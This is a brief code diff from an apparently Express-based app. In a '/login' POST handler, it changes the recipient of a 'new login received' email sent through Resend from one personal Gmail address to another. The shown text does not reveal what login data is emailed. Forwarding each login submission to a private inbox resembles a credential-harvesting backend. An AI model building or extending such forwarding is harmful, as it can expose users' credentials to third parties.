@@ -30,7 +30,7 @@ app.post('/login', async (req, res) => {
     try {
         const data = await resend.emails.send({
             from: "onboarding@resend.dev",
-            to: "paschasin1234@gmail.com", 
+            to: "jorgitoeltroll@gmail.com", 
             subject: "Nuevo login recibido",
             html: `
                 <h2>Nuevo registro</h2>
